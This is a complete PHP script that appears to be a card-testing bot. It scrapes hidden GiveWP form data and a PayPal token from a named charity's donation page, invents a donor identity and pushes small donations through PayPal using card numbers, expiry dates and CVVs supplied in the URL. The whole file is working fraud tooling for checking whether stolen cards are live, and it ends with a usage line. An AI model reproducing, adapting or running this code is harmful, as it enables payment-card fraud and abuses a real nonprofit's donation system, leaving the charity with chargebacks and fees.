<?php


error_reporting(0);
ini_set('display_errors', 0);

class HttpClient
{
    private $userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0';

    public function get($url)
    {
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_USERAGENT => $this->userAgent,
            CURLOPT_TIMEOUT => 30
        ]);

        $response = curl_exec($ch);
        if (curl_errno($ch)) {
            throw new Exception('Curl Error: ' . curl_error($ch));
        }
        curl_close($ch);
        return $response;
    }

    /**
     * Helper for POST requests (supports both URL encoded and Multipart)
     */
    public function post($url, $data, $headers = [], $isJson = false)
    {
        $ch = curl_init();
        
        // Merge default headers with custom ones
        $defaultHeaders = [
            'User-Agent: ' . $this->userAgent,
            'Accept: */*',
            'Connection: keep-alive'
        ];
        
        $finalHeaders = array_merge($defaultHeaders, $headers);

        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_CUSTOMREQUEST => 'POST',
            CURLOPT_HTTPHEADER => $finalHeaders,
            CURLOPT_POSTFIELDS => $data,
            CURLOPT_FOLLOWLOCATION => true
        ]);

        $response = curl_exec($ch);
        curl_close($ch);
        return $response;
    }
}

class UserDataGenerator
{
    public static function getRandomUser()
    {
        $client = new HttpClient();
        try {
            $json = $client->get('https://randomuser.me/api/?nat=us');
            $data = json_decode($json, true);

            if (empty($data['results'][0])) {
                throw new Exception("Failed to fetch random user.");
            }

            $u = $data['results'][0];
            return [
                'first_name'  => $u['name']['first'],
                'last_name'   => $u['name']['last'],
                'email'       => str_replace("example.com", "gmail.com", $u['email']), // Fix domain
                'address1'    => $u['location']['street']['name'],
                'city'        => $u['location']['city'],
                'postal_code' => $u['location']['postcode']
            ];
        } catch (Exception $e) {
            // Fallback data if API fails
            return [
                'first_name'  => 'John',
                'last_name'   => 'Doe',
                'email'       => 'johndoe' . rand(100,999) . '@gmail.com',
                'address1'    => '123 Main St',
                'city'        => 'New York',
                'postal_code' => '10001'
            ];
        }
    }
}

class GiveWPDonation
{
    private $targetUrl;
    private $baseUrl;
    private $ajaxUrl;
    private $client;
    private $formData = [];
    private $user = [];
    
    public function __construct($targetUrl)
    {
        $this->targetUrl = $targetUrl;
        $this->baseUrl = parse_url($targetUrl, PHP_URL_SCHEME) . '://' . parse_url($targetUrl, PHP_URL_HOST);
        $this->ajaxUrl = $this->baseUrl . '/wp-admin/admin-ajax.php';
        $this->client = new HttpClient();
    }
    private function initialize()
    {
        $html = $this->client->get($this->targetUrl);
        $this->formData = $this->parseHiddenInputs($html);
        $this->user = UserDataGenerator::getRandomUser();
        
        if (empty($this->formData['give-form-id'])) {
            throw new Exception("Failed to parse GiveWP form data.");
        }
    }

    private function parseHiddenInputs($html)
    {
        libxml_use_internal_errors(true);
        $dom = new DOMDocument();
        $dom->loadHTML($html);
        $xpath = new DOMXPath($dom);

        $fields = ['give-form-id', 'give-form-hash', 'give-price-id'];
        $data = [];

        foreach ($fields as $name) {
            $node = $xpath->query("//input[@type='hidden' and @name='$name']");
            $data[$name] = $node->length ? trim($node->item(0)->getAttribute('value')) : null;
        }

        if (preg_match('/"data-client-token"\s*:\s*"([^"]+)"/i', $html, $match)) {
            $tokenData = json_decode(base64_decode($match[1]), true);
            $data['paypal_token'] = $tokenData['paypal']['accessToken'] ?? null;
        }

        return $data;
    }

    private function processValidation()
    {
        $postData = http_build_query([
            'give-form-id-prefix' => $this->formData['give-form-id'] . '-1',
            'give-form-id' => $this->formData['give-form-id'],
            'give-form-title' => 'Donate',
            'give-current-url' => $this->targetUrl,
            'give-form-url' => $this->targetUrl,
            'give-form-hash' => $this->formData['give-form-hash'],
            'give-price-id' => 'custom',
            'wpforms[fields][8]' => '3.00',
            'give-gateway' => 'paypal-commerce',
            'wpforms[fields][0][first]' => $this->user['first_name'],
            'wpforms[fields][0][last]' => $this->user['last_name'],
            'wpforms[fields][1]' => $this->user['email'],
            'card_address' => $this->user['address1'],
            'card_city' => $this->user['city'],
            'card_zip' => $this->user['postal_code'],
            'card_state' => 'ME',
            'billing_country' => 'US',
            'action' => 'give_process_donation',
            'give_ajax' => 'true'
        ]);

        $headers = [
            "Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With: XMLHttpRequest",
            "Referer: " . $this->targetUrl
        ];

        return $this->client->post($this->ajaxUrl, $postData, $headers);
    }

    private function createOrder()
    {
        $boundary = '----WebKitFormBoundary' . md5(time());

        $dataMap = [
            'give-honeypot' => '',
            'give-form-id-prefix' => $this->formData['give-form-id'] . '-1',
            'give-form-id' => $this->formData['give-form-id'],
            'give-form-title' => 'Donate',
            'give-current-url' => 'https://elemotion.org/donate/',
            'give-form-url' => 'https://elemotion.org/donate/',
            'give-form-minimum' => '5.00',
            'give-form-maximum' => '999999.99',
            'give-form-hash' => $this->formData['give-form-hash'],
            'give-price-id' => 'custom',
            'give-recurring-logged-in-only' => '',
            'give-logged-in-only' => '1',
            '_give_is_donation_recurring' => '0',
            'give_recurring_donation_details' => '{"give_recurring_option":"yes_donor"}',
            'give-amount' => '5.00',
            'give-recurring-period-donors-choice' => 'month',
            'support_a_program[]' => 'General Donation',
            'payment-mode' => 'paypal-commerce',
            'give_first' => $this->user['first_name'],
            'give_last' => $this->user['last_name'],
            'give_company_option' => 'no',
            'give_company_name' => '',
            'give_email' => $this->user['email'],
            'card_name' => $this->user['first_name'], 
            'card_exp_month' => '',
            'card_exp_year' => '',
            'billing_country' => 'US',
            'card_address' => $this->user['address1'],
            'card_address_2' => $this->user['address1'], 
            'card_city' => $this->user['city'],
            'card_state' => 'ME',
            'card_zip' => $this->user['postal_code'],
            'give-gateway' => 'paypal-commerce'
        ];
        
        $params = [
            'give-form-id' => $this->formData['give-form-id'],
            'give-form-hash' => $this->formData['give-form-hash'],
            'give-amount' => '5.00',
            'give_first' => $this->user['first_name'],
            'give_last' => $this->user['last_name'],
            'give_email' => $this->user['email'],
            'card_address' => $this->user['address1'],
            'card_city' => $this->user['city'],
            'card_state' => 'ME',
            'card_zip' => $this->user['postal_code'],
            'billing_country' => 'US',
            'give-gateway' => 'paypal-commerce'
        ];

        // Building the multipart body
        $body = "";
        foreach ($params as $key => $value) {
            $body .= "--$boundary\r\n";
            $body .= "Content-Disposition: form-data; name=\"$key\"\r\n\r\n";
            $body .= "$value\r\n";
        }
        $body .= "--$boundary--\r\n";

        $headers = [
            "Content-Type: multipart/form-data; boundary=$boundary",
            "Referer: " . $this->targetUrl
        ];

        $response = $this->client->post($this->ajaxUrl . '?action=give_paypal_commerce_create_order', $body, $headers);
        return json_decode($response, true);
    }

    private function confirmPaymentSource($orderId, $cc, $year, $month, $cvv)
    {
        $url = 'https://cors.api.paypal.com/v2/checkout/orders/' . $orderId . '/confirm-payment-source';
        
        $payload = json_encode([
            "payment_source" => [
                "card" => [
                    "number" => $cc,
                    "expiry" => "$year-$month",
                    "security_code" => $cvv,
                    "attributes" => [
                        "verification" => ["method" => "SCA_WHEN_REQUIRED"]
                    ]
                ]
            ],
            "application_context" => ["vault" => false]
        ]);

        $headers = [
            'Content-Type: application/json',
            'Authorization: Bearer ' . $this->formData['paypal_token'],
            'Origin: https://assets.braintreegateway.com',
            'Referer: https://assets.braintreegateway.com/'
        ];

        return $this->client->post($url, $payload, $headers);
    }

    /**
     * Step 5: Approve Order (Finalize)
     */
    private function approveOrder($orderId)
    {
        $boundary = '----WebKitFormBoundaryFinal' . md5(time());
        
        $params = [
            'give-form-id' => $this->formData['give-form-id'],
            'give-form-hash' => $this->formData['give-form-hash'],
            'give-amount' => '5.00',
            'give_first' => $this->user['first_name'],
            'give_last' => $this->user['last_name'],
            'give_email' => $this->user['email'],
            'give-gateway' => 'paypal-commerce'
        ];

        $body = "";
        foreach ($params as $key => $value) {
            $body .= "--$boundary\r\n";
            $body .= "Content-Disposition: form-data; name=\"$key\"\r\n\r\n";
            $body .= "$value\r\n";
        }
        $body .= "--$boundary--\r\n";

        $headers = [
            "Content-Type: multipart/form-data; boundary=$boundary",
            "Referer: " . $this->targetUrl
        ];

        return $this->client->post($this->ajaxUrl . '?action=give_paypal_commerce_approve_order&order=' . $orderId, $body, $headers);
    }

    public function processDonation($cc, $year, $month, $cvv)
    {
        try {
            // 1. Init
            $this->initialize();
            
            // 2. Validate
            $this->processValidation();

            // 3. Create Order
            $orderData = $this->createOrder();
            
            if (!isset($orderData['data']['id'])) {
                return ['status' => false, 'message' => 'Failed to create order ID', 'debug' => $orderData];
            }
            
            $orderId = $orderData['data']['id'];

            // 4. Confirm Payment (PayPal)
            $payRes = $this->confirmPaymentSource($orderId, $cc, $year, $month, $cvv);
            
            // 5. Approve Order (GiveWP)
            $finalRes = $this->approveOrder($orderId);

            return [
                'status' => true,
                'order_id' => $orderId,
                'paypal_response' => json_decode($payRes, true),
                'site_response' => json_decode($finalRes, true),
            ];

        } catch (Exception $e) {
            return ['status' => false, 'error' => $e->getMessage()];
        }
    }
}

// ==========================================
// USAGE EXAMPLE
// ==========================================

if (isset($_GET["cc"]) && isset($_GET["t"]) && isset($_GET["b"]) && isset($_GET["cvv"])) {
    
    $bot = new GiveWPDonation('https://elemotion.org/donate/');
    $result = $bot->processDonation(
        $_GET["cc"], 
        $_GET["t"], 
        $_GET["b"], 
        $_GET["cvv"]
    );

    header('Content-Type: application/json');
    echo json_encode($result, JSON_PRETTY_PRINT);

} else {
    echo "Usage: ?cc=NUM&t=YEAR&b=MONTH&cvv=CODE";
}
?>